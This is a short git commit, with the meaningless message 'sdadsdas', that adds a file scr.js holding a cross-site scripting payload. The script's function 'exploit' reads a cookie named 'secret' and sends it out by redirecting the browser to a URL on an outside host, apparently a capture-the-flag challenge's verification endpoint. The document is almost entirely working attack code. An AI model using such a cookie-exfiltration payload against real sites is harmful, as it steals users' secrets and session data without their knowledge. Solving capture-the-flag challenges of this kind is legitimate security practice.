454b5f2f39a38b0f1ce4b289a6b969930b154fc1
Andrea Martino <andrea@a-mbp.homenet.telecomitalia.it>
2019-09-21 23:21:01 +0200

    sdadsdas

---
+++ scr.js
@@ -0,0 +1,7 @@
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
+<script>
+function exploit() {
+		window.location = "https://chall.necst.it/challenges/web4/verify/1321/"+Cookies.get("secret");
+		alert("test");
+	};
+</script>
